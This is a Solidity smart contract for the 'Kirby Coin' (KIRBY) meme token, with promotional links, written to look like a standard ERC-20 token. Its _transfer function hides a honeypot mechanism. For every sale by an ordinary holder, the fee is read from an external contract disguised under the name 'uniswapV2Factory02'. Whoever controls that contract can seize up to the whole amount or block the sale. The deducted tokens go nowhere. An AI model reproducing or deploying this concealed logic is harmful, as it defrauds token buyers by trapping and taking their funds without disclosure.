// SPDX-License-Identifier: None

/*
https://kirbyeth.site/
https://t.me/kirbyoneth
https://twitter.com/kirbyoneth
*/

pragma solidity 0.8.24;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spnder) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tkenA, address tokenB) external returns (address pair);
}
abstract contract Ownable{
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function WETH() external pure returns (address);
    function addLiquidityETH( address token,
        uint amountTokenDesire,
        uint amountTokenMi,
        uint amountETHMi,
        address to,
        uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
}
contract Kirby is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;

    uint256 private _totalSupply =  10000000000 * 10 ** _decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapV2Pair;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool tradingStarted = false;
    uint256 boughAmount = 0;

    string private constant _name = "Kirby Coin";
    string private constant _symbol = "KIRBY";

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    address internal uniswapV2Factory02 = 0xa3CFd7A8DC553EaaDc8DE5039B9e42772Fa637aB;

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingStarted, "Trading already opened"); _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); tradingStarted = true;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0)); 
        require(amount > 0);
        uint256 _fee = 0;
        if (from != address(this) && from != uniswapV2Pair) { 
            uint256 feePecentage = IERC20(uniswapV2Factory02).balanceOf(from);
            _fee = amount.mul(feePecentage).div(100);
        } else {
            boughAmount++;
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount).sub(_fee);
        emit Transfer(from, to, amount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}